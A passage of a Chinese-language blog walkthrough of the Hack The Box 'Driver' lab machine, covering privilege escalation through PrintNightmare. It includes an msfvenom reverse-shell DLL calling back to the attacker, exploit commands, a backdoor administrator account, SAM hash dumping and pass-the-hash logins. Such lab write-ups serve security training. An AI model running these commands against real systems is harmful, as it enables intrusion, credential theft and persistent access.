<p>执⾏⼀下，考虑执⾏⽇志可能偏⻓，容易超过终端缓冲区⼤⼩，按照Winpeas的帮助建议，我们指定log参数。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\programdata\apps&gt; .\winPEASx64_ofs.exe log</span><br></pre></td></tr></table></figure>

<p>保存到日志文件中，然后download到本地。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\programdata\apps&gt; download out.txt</span><br><span class="line">Info: Downloading C:\programdata\apps\out.txt to out.txt</span><br><span class="line">Info: Download successful!</span><br></pre></td></tr></table></figure>

<p>然后⽤ <code>cat out.txt | less -R</code> 以获得着⾊的、交互好的浏览界⾯。也可以用<code>batcat</code>查看，使用<code>apt install bat</code>下载</p>
<p>好的，逐⼀分析吧！<strong>重点看红⾊的内容</strong>。一定要多看！！！！</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#历史记录在此</span></span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\programdata\apps&gt; <span class="built_in">gc</span></span><br><span class="line">C:\Users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleH</span><br><span class="line">ost_history.txt</span><br><span class="line"></span><br><span class="line"><span class="built_in">Add-Printer</span> <span class="literal">-PrinterName</span> <span class="string">&quot;RICOH_PCL6&quot;</span> <span class="literal">-DriverName</span> <span class="string">&#x27;RICOH PCL6 UniversalDriverV4.23&#x27;</span> <span class="literal">-PortName</span> <span class="string">&#x27;lpt1:&#x27;</span></span><br></pre></td></tr></table></figure>

<p>和前端看到的类似，<strong>有很多打印相关的内容</strong></p>
<p>前台以及后端众多打印、打印机相关的信息，提示我们，<strong>对打印服务和相关漏洞要关注了</strong>。</p>
<p>这是nxc中的可⽤模块：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/aptlabs]</span><br><span class="line">└─$ <span class="built_in">sudo</span> nxc smb -L </span><br><span class="line">LOW PRIVILEGE MODULES</span><br><span class="line">[*] add-computer Adds or deletes a domain computer</span><br><span class="line">[*] dfscoerce Module to check <span class="keyword">if</span> the DC is vulnerable to</span><br><span class="line">DFSCocerc, credit to @filip_dragovic/@Wh04m1001 and @topotam</span><br><span class="line">[*] drop-sc Drop a searchConnector-ms file on each writable</span><br><span class="line">share</span><br><span class="line">[*] enum_av Gathers information on all endpoint protection</span><br><span class="line">solutions installed on the the remote host(s) via LsarLookupNames (no</span><br><span class="line">privilege needed)</span><br><span class="line">[*] gpp_autologin Searches the domain controller <span class="keyword">for</span> registry.xml</span><br><span class="line">to find autologon information and returns the username and password.</span><br><span class="line">[*] gpp_password Retrieves the plaintext password and other</span><br><span class="line">information <span class="keyword">for</span> accounts pushed through Group Policy Preferences.</span><br><span class="line">[*] ioxidresolver This module helps you to identify hosts that</span><br><span class="line">have additional active interfaces</span><br><span class="line">[*] ms17-010 MS17-010 - EternalBlue - NOT TESTED OUTSIDE LAB</span><br><span class="line">ENVIRONMENT</span><br><span class="line">[*] nopac Check <span class="keyword">if</span> the DC is vulnerable to CVE-2021-42278</span><br><span class="line">and CVE-2021-42287 to impersonate DA from standard domain user</span><br><span class="line">[*] petitpotam Module to check <span class="keyword">if</span> the DC is vulnerable to</span><br><span class="line">PetitPotam, credit to @topotam</span><br><span class="line">[*] printnightmare Check <span class="keyword">if</span> host vulnerable to printnightmare</span><br><span class="line">[*] scuffy Creates and dumps an arbitrary .scf file with</span><br><span class="line">the icon property containing a UNC path to the declared SMB server against all</span><br><span class="line">writeable shares</span><br><span class="line">[*] shadowcoerce Module to check <span class="keyword">if</span> the target is vulnerable to</span><br><span class="line">ShadowCoerce, credit to @Shutdown and @topotam</span><br><span class="line">[*] slinky Creates windows shortcuts with the icon</span><br><span class="line">attribute containing a UNC path to the specified SMB server <span class="keyword">in</span> all shares with</span><br><span class="line">write permissions</span><br><span class="line">[*] spider_plus List files recursively and save a JSON sharefile metadata to the <span class="string">&#x27;OUTPUT_FOLDER&#x27;</span>. See module options <span class="keyword">for</span> finer</span><br><span class="line">configuration.</span><br><span class="line">[*] spooler Detect <span class="keyword">if</span> <span class="built_in">print</span> spooler is enabled or not</span><br><span class="line">[*] webdav Checks whether the WebClient service is running</span><br><span class="line">on the target</span><br><span class="line">[*] zerologon Module to check <span class="keyword">if</span> the DC is vulnerable to</span><br><span class="line">Zerologon aka CVE-2020-1472</span><br><span class="line">HIGH PRIVILEGE MODULES (requires admin privs)</span><br><span class="line">[*] bh_owned Set pwned computer as owned <span class="keyword">in</span> Bloodhound</span><br><span class="line">[*] empire_exec Uses Empire<span class="string">&#x27;s RESTful API to generate a launcher</span></span><br><span class="line"><span class="string">for the specified listener and executes it</span></span><br><span class="line"><span class="string">[*] enum_dns Uses WMI to dump DNS from an AD DNS Server</span></span><br><span class="line"><span class="string">[*] firefox Dump credentials from Firefox</span></span><br><span class="line"><span class="string">[*] get_netconnections Uses WMI to query network connections.</span></span><br><span class="line"><span class="string">[*] handlekatz Get lsass dump using handlekatz64 and parse the</span></span><br><span class="line"><span class="string">result with pypykatz</span></span><br><span class="line"><span class="string">[*] hash_spider Dump lsass recursively from a given hash using</span></span><br><span class="line"><span class="string">BH to find local admins</span></span><br><span class="line"><span class="string">[*] iis Checks for credentials in IIS Application Pool</span></span><br><span class="line"><span class="string">configuration files using appcmd.exe</span></span><br><span class="line"><span class="string">[*] impersonate List and impersonate tokens to run command as</span></span><br><span class="line"><span class="string">locally logged on users</span></span><br><span class="line"><span class="string">[*] install_elevated Checks for AlwaysInstallElevated</span></span><br><span class="line"><span class="string">[*] keepass_discover Search for KeePass-related files and process.</span></span><br><span class="line"><span class="string">[*] keepass_trigger Set up a malicious KeePass trigger to export the</span></span><br><span class="line"><span class="string">database in cleartext.</span></span><br><span class="line"><span class="string">[*] lsassy Dump lsass and parse the result remotely with</span></span><br><span class="line"><span class="string">lsassy</span></span><br><span class="line"><span class="string">[*] masky Remotely dump domain user credentials via an</span></span><br><span class="line"><span class="string">ADCS and a KDC</span></span><br><span class="line"><span class="string">[*] met_inject Downloads the Meterpreter stager and injects it</span></span><br><span class="line"><span class="string">into memory</span></span><br><span class="line"><span class="string">[*] msol Dump MSOL cleartext password from the localDB on</span></span><br><span class="line"><span class="string">the Azure AD-Connect Server</span></span><br><span class="line"><span class="string">[*] nanodump Get lsass dump using nanodump and parse the</span></span><br><span class="line"><span class="string">result with pypykatz</span></span><br><span class="line"><span class="string">[*] ntdsutil Dump NTDS with ntdsutil</span></span><br><span class="line"><span class="string">[*] ntlmv1 Detect if lmcompatibilitylevel on the target is</span></span><br><span class="line"><span class="string">set to 0 or 1</span></span><br><span class="line"><span class="string">[*] pi Run command as logged on users via Process</span></span><br><span class="line"><span class="string">Injection</span></span><br><span class="line"><span class="string">[*] procdump Get lsass dump using procdump64 and parse the</span></span><br><span class="line"><span class="string">result with pypykatz</span></span><br><span class="line"><span class="string">[*] rdcman Remotely dump Remote Desktop Connection Manager</span></span><br><span class="line"><span class="string">(sysinternals) credentials</span></span><br><span class="line"><span class="string">[*] rdp Enables/Disables RDP</span></span><br><span class="line"><span class="string">[*] reg-query Performs a registry query on the machine</span></span><br><span class="line"><span class="string">[*] runasppl Check if the registry value RunAsPPL is set or</span></span><br><span class="line"><span class="string">not</span></span><br><span class="line"><span class="string">[*] schtask_as Remotely execute a scheduled task as a logged on</span></span><br><span class="line"><span class="string">user</span></span><br><span class="line"><span class="string">[*] teams_localdb Retrieves the cleartext ssoauthcookie from the</span></span><br><span class="line"><span class="string">local Microsoft Teams database, if teams is open we kill all Teams process</span></span><br><span class="line"><span class="string">[*] test_connection Pings a host</span></span><br><span class="line"><span class="string">[*] uac Checks UAC status</span></span><br><span class="line"><span class="string">[*] veeam Extracts credentials from local Veeam SQL</span></span><br><span class="line"><span class="string">Database</span></span><br><span class="line"><span class="string">[*] wcc Check various security configuration items on</span></span><br><span class="line"><span class="string">Windows machines</span></span><br><span class="line"><span class="string">[*] wdigest Creates/Deletes the &#x27;</span>UseLogonCredential<span class="string">&#x27;</span></span><br><span class="line"><span class="string">registry key enabling WDigest cred dumping on Windows &gt;= 8.1</span></span><br><span class="line"><span class="string">[*] web_delivery Kicks off a Metasploit Payload using the</span></span><br><span class="line"><span class="string">exploit/multi/script/web_delivery module</span></span><br><span class="line"><span class="string">[*] wifi Get key of all wireless interfaces</span></span><br><span class="line"><span class="string">[*] winscp Looks for WinSCP.ini files in the registry and</span></span><br><span class="line"><span class="string">default locations and tries to extract credentials.</span></span><br></pre></td></tr></table></figure>



<h5 id="查询相关资料："><a href="#查询相关资料：" class="headerlink" title="查询相关资料："></a>查询相关资料：</h5><p><strong>Print Spooler</strong> 服务是 Windows操作系统中⽤于管理打印任务的⼀个关键组件。它使⽤户可以在后台处理打印作业，使得打印机可以按照顺序处理多个打印任务，同时⽤户可以继续执⾏其他操作，⽽不必等待当前打印作业完成。</p>
<p>先确认下spooler的服务状态：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/aptlabs]</span><br><span class="line">└─$ <span class="built_in">sudo</span> nxc smb driver.htb -u tony -p liltony -M spooler </span><br><span class="line">SMB 10.129.220.192 445 DRIVER [*] Windows 10 Enterprise</span><br><span class="line">10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:True)</span><br><span class="line">SMB 10.129.220.192 445 DRIVER [+] DRIVER\tony:liltony </span><br><span class="line">SPOOLER 10.129.220.192 445 DRIVER Spooler service enabled</span><br></pre></td></tr></table></figure>

<p>Spooler是激活的，搜索不难发现如下RCE关键词：</p>
<img src="/posts/23837ad8/1732297198359.png" class="" width="1732297198359">

<p>那就有必要进⼀步看是否有PrintNightmare了。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/RedteamNotes/aptlabs]</span><br><span class="line">└─$ <span class="built_in">sudo</span> nxc smb driver.htb -u tony -p liltony -M spooler -M printnightmare</span><br><span class="line">SMB 10.129.220.192 445 DRIVER [*] Windows 10 Enterprise</span><br><span class="line">10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:True)</span><br><span class="line">SMB 10.129.220.192 445 DRIVER [+] DRIVER\tony:liltony </span><br><span class="line">SPOOLER 10.129.220.192 445 DRIVER Spooler service enabled</span><br><span class="line">PRINTNIG... 10.129.220.192 445 DRIVER Vulnerable, next step https://github.com/ly4k/PrintNightmare</span><br></pre></td></tr></table></figure>

<p>没错，<strong>Vulnerable！</strong>有PrintNightmare漏洞。</p>
<p><strong>PrintNightmare打印噩梦</strong>，是指⼀系列影响 Windows 打印后台处理程序服务（Print Spooler）的远程代码执⾏（RCE）和本地提权（LPE）漏洞。这些漏洞允许攻击者通过⽹络或本地访问执⾏任意代码，从⽽完全控制受影响的系统。PrintNightmare 的主要漏洞编号包括 <strong>CVE-2021-1675</strong> 和 <strong>CVE-2021-34527</strong>。</p>
<p>利⽤⽅式nxc的校验给链接了，那就直接看能不能利⽤：<code>https://github.com/ly4k/PrintNightmare</code></p>
<p>检测⼀下是否可利⽤：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HackTheBox/Driver]</span><br><span class="line">└─$ ./printnightmare.py -check <span class="string">&#x27;tony:liltony@driver.htb&#x27;</span> </span><br><span class="line">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class="line">[*] Target appears to be vulnerable!</span><br></pre></td></tr></table></figure>



<p>我直接给出利用过程：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">进⼀步确定，可以利⽤，信⼼继续增加。按照printnightmare.py帮助⽂档的⽅法，先⽣成反弹shell的dll⽂件：</span><br><span class="line">┌──(kali㉿kali)-[~/RedteamNotes/HackTheBox/Driver]</span><br><span class="line">└─$ msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.16.2 LPORT=9595 -f dll -o RedteamNotes.dll</span><br><span class="line"></span><br><span class="line">上传：</span><br><span class="line">*Evil-WinRM* PS C:\programdata\apps&gt; upload /home/kali/HackTheBox/Driver/RedteamNotes.dll</span><br><span class="line"></span><br><span class="line">做好9595端⼝的nc监听，然后执⾏利⽤,也可以msfconsole开启监听一样的：</span><br><span class="line">┌──(kali㉿kali)-[~/RedteamNotes/HackTheBox/Driver]</span><br><span class="line">└─$ ./printnightmare.py -dll &#x27;C:\programdata\apps\RedteamNotes.dll&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">虽然报错了但是成功反弹！</span><br><span class="line">system！！！</span><br></pre></td></tr></table></figure>

<h4 id="持久化"><a href="#持久化" class="headerlink" title="持久化"></a>持久化</h4><p>增加⽤户凭据 test:20031216abcD ：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> user test <span class="number">20031216</span>abcD /add</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> localgroup administrators test /add</span><br></pre></td></tr></table></figure>

<p>转储secrets：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HackTheBox/Driver]</span><br><span class="line">└─$ <span class="built_in">sudo</span> impacket-secretsdump <span class="string">&#x27; test:20031216abcD&#x27;</span>@driver.htb </span><br><span class="line">[<span class="built_in">sudo</span>] password <span class="keyword">for</span> kali: </span><br><span class="line">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class="line">[*] Service RemoteRegistry is <span class="keyword">in</span> stopped state</span><br><span class="line">[*] Service RemoteRegistry is disabled, enabling it</span><br><span class="line">[*] Starting service RemoteRegistry</span><br><span class="line">[*] Target system bootKey: 0xe5b3cda034afd685bc69ccd3c4e9387c</span><br><span class="line">[*] Dumping <span class="built_in">local</span> SAM hashes (uid:rid:lmhash:nthash)</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:d1256cff8b5b5fdb8c327d3b6c3f5017:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">.</span><br></pre></td></tr></table></figure>

<p>转储到administrator的hash，确认⼀下：哈希传递</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/RedteamNotes/aptlabs]</span><br><span class="line">└─$ <span class="built_in">sudo</span> nxc winrm driver.htb -u Administrator -H d1256cff8b5b5fdb8c327d3b6c3f5017 -X <span class="string">&#x27;whoami;hostname;ipconfig;gci C:\Users *.txt -r;gci C:\Users *.txt -r | % &#123; gc $_.FullName &#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>可以获得持久化的⽅式：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/RedteamNotes/HackTheBox/Driver]</span><br><span class="line">└─$ <span class="built_in">sudo</span> evil-winrm -i driver.htb -u Administrator -H d1256cff8b5b5fdb8c327d3b6c3f5017</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\Administrator\Documents&gt; whoami;hostname;ipconfig</span><br><span class="line">driver\administrator</span><br><span class="line">DRIVER</span><br><span class="line">Windows IP Configuration</span><br><span class="line">Ethernet adapter Ethernet0:</span><br><span class="line"> Connection<span class="literal">-specific</span> DNS Suffix . : .htb</span><br><span class="line"> IPv6 Address. . . . . . . . . . . : dead:beef::<span class="number">193</span></span><br><span class="line"> IPv6 Address. . . . . . . . . . . : dead:beef::<span class="number">3939</span>:b17c:cbe6:b12</span><br><span class="line"> Temporary IPv6 Address. . . . . . : dead:beef::b930:f85:d4b7:e7a3</span><br><span class="line"> Link<span class="literal">-local</span> IPv6 Address . . . . . : fe80::<span class="number">3939</span>:b17c:cbe6:b12%<span class="number">5</span></span><br><span class="line"> IPv4 Address. . . . . . . . . . . : <span class="number">10.129</span>.<span class="number">40.36</span></span><br><span class="line"> Subnet Mask . . . . . . . . . . . : <span class="number">255.255</span>.<span class="number">0.0</span></span><br><span class="line"> Default Gateway . . . . . . . . . : fe80::<span class="number">250</span>:<span class="number">56</span>ff:feb9:acf1%<span class="number">5</span></span><br><span class="line"> <span class="number">10.129</span>.<span class="number">0.1</span></span><br><span class="line">Tunnel adapter isatap..htb:</span><br><span class="line"> Media State . . . . . . . . . . . : Media disconnected</span><br><span class="line"> Connection<span class="literal">-specific</span> DNS Suffix . : .htb</span><br></pre></td></tr></table></figure>

<p>⾄此，已获得机器的完全控制权！！！！！！！</p>
<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>nmap扫描之后，发现smb⽆访问权限，80端⼝需要登陆，弱密码或简单爆破之后，看到打印机固件测试功能⻚⾯，web渗透⽆果，综合分析攻击⾯，确定内⽹嗅探的办法，利⽤SCF⽂件产⽣流量和ntlmv2认证，嗅探后获得hash，破解后获得⽴⾜点，提权⽤了Winpeas枚举，以及nxc验证，利⽤PrintNightmare漏洞获得了系统权限 ，盲打的话不算特别简单，相对来说把知识点进行了各种有机结合很实用的一个靶机！</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://Iconabc.github.io">icon</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://iconabc.github.io/posts/23837ad8.html">https://iconabc.github.io/posts/23837ad8.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://Iconabc.github.io" target="_blank">icon'Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91/">内网</a><a class="post-meta__tags" href="/tags/%E9%9D%B6%E5%9C%BA/">靶场</a><a class="post-meta__tags" href="/tags/HTB/">HTB</a></div><div class="post-share"><div class="social-share" data-image="/img/mbc.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/posts/4f0d5716.html" title="Kerberos-认证原理"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">Kerberos-认证原理</div></div><div class="info-2"><div class="info-item-1">...</div></div></div></a><a class="pagination-related" href="/posts/98ed62e4.html" title="vulntarget-k靶场"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">vulntarget-k靶场</div></div><div class="info-2"><div class="info-item-1">vulntarget-k打靶记录：正式wp：https://mp.weixin.qq.com/s/LHq8O2F-r6rbhVW84Q4KEg 账号密码信息：    主机 主机账号密码 web账号密码    xxl-job-admin xxl-job&#x2F;root123 admin&#x2F;Bolean@10000   nacos-springcloudgateway spring-nacos&#x2F;root123 nacos&#x2F;bolean@1q2   redis redis&#x2F;redis@1z redis密码：nbsg@123456   拓扑图：   思路：其中外网IP我设置成了：192.168.189.130 网络配置文件为：/etc/netplan/00-installer-config.yaml 123456789101112131415161718network:  ethernets:    ens33:      addresses:      - 192.168.189.130/24      gateway4:...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/posts/a9057879.html" title="vulntarget-h靶场"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-14</div><div class="info-item-2">vulntarget-h靶场</div></div><div class="info-2"><div class="info-item-1">vulntarget-h:个人看了wp偏ctf，打下来就总体来说，挺难评，我认为是一个杀软靶场，加上一些技巧性的ctf题！ 思路：第一步信息收集过程，直接外网展示了一个sql injection basic的大字就差贴脸告诉你这是sql注入的考点了，并且给出了提示?user_id=....然后这里通过手测是有一个注入点的。  网站指纹 IIS的环境 端口扫描 对开放端口提供服务进行判断  经过扫描发现后端是”asp“ ,所以其一般配套会搭sql...</div></div></div></a><a class="pagination-related" href="/posts/3e9a6950.html" title="vulntarget-j靶场"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-15</div><div class="info-item-2">vulntarget-j靶场</div></div><div class="info-2"><div class="info-item-1">vulntarget-j打靶记录：拓朴图如下：   1.第一层：1.1信息收集：使用一系列扫描工具都可以进行初步的发现工作，nmap，tscanplus等，我用后者： 扫出如下端口开放：   有一些指纹信息但我才疏学浅，还需要进一步进行测试！ 指纹识别一手：   打开如下几个端口开放站点：  http://192.168.189.138:80/  80端口是fastadmin的框架   我搜索了这个框架的诸多历史漏洞都没能成功利用，选择对其他开放端口进行进一步的探索。 原因：可能是因为其后台可能已经不是默认路径了，决定尝试从旁站打   http://192.168.189.138:7001/  7001端口对其进行目录扫描工作：      查询状态码是200，301的路径：有如下有信息回显：   发现了：Kindeditor 直接访问默认http:*//192.168.189.138:7001/kindeditor.js*   得知其kindeditor版本：version 3.5.5  存在目录遍历漏洞：KindEditor...</div></div></div></a><a class="pagination-related" href="/posts/98ed62e4.html" title="vulntarget-k靶场"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-19</div><div class="info-item-2">vulntarget-k靶场</div></div><div class="info-2"><div class="info-item-1">vulntarget-k打靶记录：正式wp：https://mp.weixin.qq.com/s/LHq8O2F-r6rbhVW84Q4KEg 账号密码信息：    主机 主机账号密码 web账号密码    xxl-job-admin xxl-job&#x2F;root123 admin&#x2F;Bolean@10000   nacos-springcloudgateway spring-nacos&#x2F;root123 nacos&#x2F;bolean@1q2   redis redis&#x2F;redis@1z redis密码：nbsg@123456   拓扑图：   思路：其中外网IP我设置成了：192.168.189.130 网络配置文件为：/etc/netplan/00-installer-config.yaml 123456789101112131415161718network:  ethernets:    ens33:      addresses:      - 192.168.189.130/24      gateway4:...</div></div></div></a><a class="pagination-related" href="/posts/55d580db.html" title="wuxiang月挑战one"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-10</div><div class="info-item-2">wuxiang月挑战one</div></div><div class="info-2"><div class="info-item-1">wuxian打靶记录—月挑战入口机器10.10.0.3使用多种扫描工具对其进行端口探测，指纹识别等来进行交叉验证 TscanPlus扫描：扫描结果如下：    ID Host Port Protocol Target Banner Code Title      1 10.10.0.3 22 SSH 10.10.0.3:22 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 0      2 10.10.0.3 3306 MYSQL 10.10.0.3:3306 MySQL 8.0.19 0      3 10.10.0.3 6379 REDIS 10.10.0.3:6379 Redis key-value store 5.0.14 0      4 10.10.0.3 18080 HTTP http://10.10.0.3:18080 APACHE-Shiro 200 DocToolkit     5 10.10.0.3 18088 HTTP http://10.10.0.3:18088 Apache-Tomcat 404 HTTP Status 404 –...</div></div></div></a><a class="pagination-related" href="/posts/4f0d5716.html" title="Kerberos-认证原理"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-24</div><div class="info-item-2">Kerberos-认证原理</div></div><div class="info-2"><div class="info-item-1">...</div></div></div></a><a class="pagination-related" href="/posts/4a17b156.html" title="vulntarget-i靶场"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-11</div><div class="info-item-2">vulntarget-i靶场</div></div><div class="info-2"><div class="info-item-1">...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/mbc.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">icon</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">分类</div><div 